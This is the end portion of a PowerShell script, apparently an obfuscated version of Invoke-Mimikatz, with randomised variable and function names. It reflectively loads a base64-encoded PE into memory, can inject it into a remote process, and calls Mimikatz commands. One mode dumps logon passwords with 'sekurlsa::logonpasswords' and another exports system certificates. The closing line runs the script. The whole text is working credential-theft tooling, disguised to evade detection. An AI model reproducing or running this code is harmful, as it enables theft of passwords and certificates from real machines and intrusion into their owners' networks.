				$GJLpePUa99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((sane ([Int64]$PEInfo.PEHandle) ([Int64]$ZhCSxMvd99.Name)))
				$YusZtKIH99 = $HDWlOjKv99.GetModuleHandle.Invoke($GJLpePUa99)
				if ($YusZtKIH99 -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $GJLpePUa99. Continuing anyways" -WarningAction Continue
				}
				
				$GBrhDMbN99 = $HDWlOjKv99.FreeLibrary.Invoke($YusZtKIH99)
				if ($GBrhDMbN99 -eq $false)
				{
					Write-Warning "Unable to free library: $GJLpePUa99. Continuing anyways." -WarningAction Continue
				}
				
				$xuiqRfpr99 = sane ($xuiqRfpr99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LJGBrAPz99.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$YruxLFWI99 = sane ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$syWGwpsh99 = serpent @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$ufMaWkAl99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($YruxLFWI99, $syWGwpsh99)
		
		$ufMaWkAl99.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$GBrhDMbN99 = $HDWlOjKv99.VirtualFree.Invoke($egdOmrAe99, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($GBrhDMbN99 -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}
	Function Main
	{
		$HDWlOjKv99 = sneaks
		$LJGBrAPz99 = Platonism
		$Win32Constants =  recommenced
		
		$MVHuzxUH99 = [IntPtr]::Zero
	
		if (($YWoghwEI99 -ne $null) -and ($YWoghwEI99 -ne 0) -and ($kaJiFGhK99 -ne $null) -and ($kaJiFGhK99 -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($kaJiFGhK99 -ne $null -and $kaJiFGhK99 -ne "")
		{
			$GHcPrVZG99 = @(Get-Process -Name $kaJiFGhK99 -ErrorAction SilentlyContinue)
			if ($GHcPrVZG99.Count -eq 0)
			{
				Throw "Can't find process $kaJiFGhK99"
			}
			elseif ($GHcPrVZG99.Count -gt 1)
			{
				$PqRAhRnY99 = Get-Process | where { $_.Name -eq $kaJiFGhK99 } | Select-Object ProcessName, Id, SessionId
				Write-Output $PqRAhRnY99
				Throw "More than one instance of $kaJiFGhK99 found, please specify the process ID to inject in to."
			}
			else
			{
				$YWoghwEI99 = $GHcPrVZG99[0].ID
			}
		}
		
		
		if (($YWoghwEI99 -ne $null) -and ($YWoghwEI99 -ne 0))
		{
			$MVHuzxUH99 = $HDWlOjKv99.OpenProcess.Invoke(0x001F0FFF, $false, $YWoghwEI99)
			if ($MVHuzxUH99 -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $YWoghwEI99"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		
		Write-Verbose "Calling Qom"
        try
        {
            $agauiVXI99 = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }
        if ($agauiVXI99 -is [array])
        {
            $jYPkOCWX99 = $agauiVXI99[0]
        } else {
            $jYPkOCWX99 = $agauiVXI99
        }
        if ( ( $jYPkOCWX99.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( "Architecture: " + $jYPkOCWX99.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$GPmJoDbZ99 = [Byte[]][Convert]::FromBase64String($PIziCNzK99)
        }
        else
        {
            [Byte[]]$GPmJoDbZ99 = [Byte[]][Convert]::FromBase64String($IHEQTmsb99)
        }
        $GPmJoDbZ99[0] = 0
        $GPmJoDbZ99[1] = 0
		$egdOmrAe99 = [IntPtr]::Zero
		if ($MVHuzxUH99 -eq [IntPtr]::Zero)
		{
			$HYgcMrTu99 = Qom -GPmJoDbZ99 $GPmJoDbZ99 -ucmYvWRU99 $ucmYvWRU99
		}
		else
		{
			$HYgcMrTu99 = Qom -GPmJoDbZ99 $GPmJoDbZ99 -ucmYvWRU99 $ucmYvWRU99 -MVHuzxUH99 $MVHuzxUH99
		}
		if ($HYgcMrTu99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$egdOmrAe99 = $HYgcMrTu99[0]
		$TVBKNPtk99 = $HYgcMrTu99[1] #only matters if you loaded in to a remote process
		
		
		$PEInfo = backslid -egdOmrAe99 $egdOmrAe99 -LJGBrAPz99 $LJGBrAPz99 -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($MVHuzxUH99 -eq [IntPtr]::Zero))
		{
                    Write-Verbose "Calling function with WString return type"
				    [IntPtr]$AdbgpFyv99 = fillet -egdOmrAe99 $egdOmrAe99 -FunctionName "powershell_reflective_mimikatz"
				    if ($AdbgpFyv99 -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $KdnhzioF99 = serpent @([IntPtr]) ([IntPtr])
				    $uMwtKyvM99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdbgpFyv99, $KdnhzioF99)
                    $FIYYOIgn99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ucmYvWRU99)
				    [IntPtr]$GQWIszfd99 = $uMwtKyvM99.Invoke($FIYYOIgn99)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($FIYYOIgn99)
				    if ($GQWIszfd99 -eq [IntPtr]::Zero)
				    {
				    	Throw "Unable to get output, Output Ptr is NULL"
				    }
				    else
				    {
				        $ifMhFOCp99 = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($GQWIszfd99)
				        Write-Output $ifMhFOCp99
				        $HDWlOjKv99.LocalFree.Invoke($GQWIszfd99);
				    }
		}
		elseif (($PEInfo.FileType -ieq "DLL") -and ($MVHuzxUH99 -ne [IntPtr]::Zero))
		{
			$LrRFRlhE99 = fillet -egdOmrAe99 $egdOmrAe99 -FunctionName "VoidFunc"
			if (($LrRFRlhE99 -eq $null) -or ($LrRFRlhE99 -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$LrRFRlhE99 = veracious $LrRFRlhE99 $egdOmrAe99
			$LrRFRlhE99 = sane $LrRFRlhE99 $TVBKNPtk99
			
			$MeyTOpXT99 = braziers -qXvylkCO99 $MVHuzxUH99 -StartAddress $LrRFRlhE99 -HDWlOjKv99 $HDWlOjKv99
		}
		
		if ($MVHuzxUH99 -eq [IntPtr]::Zero)
		{
			genii -egdOmrAe99 $egdOmrAe99
		}
		else
		{
			$GBrhDMbN99 = $HDWlOjKv99.VirtualFree.Invoke($egdOmrAe99, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($GBrhDMbN99 -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}
	Main
}
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$GaAyFlSV99  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
	{
		$ucmYvWRU99 = "sekurlsa::logonpasswords exit"
	}
    elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
    {
        $ucmYvWRU99 = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        $ucmYvWRU99 = $Command
    }
    [System.IO.Directory]::SetCurrentDirectory($pwd)
    
	if ($vLxUJFib99 -eq $null -or $vLxUJFib99 -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $PzyUFrdV99 -ArgumentList @($PIziCNzK99, $IHEQTmsb99, "Void", 0, "", $ucmYvWRU99)
	}
	else
	{
		Invoke-Command -ScriptBlock $PzyUFrdV99 -ArgumentList @($PIziCNzK99, $IHEQTmsb99, "Void", 0, "", $ucmYvWRU99) -vLxUJFib99 $vLxUJFib99
	}
}
Main
}
riced -DxNLUWTh99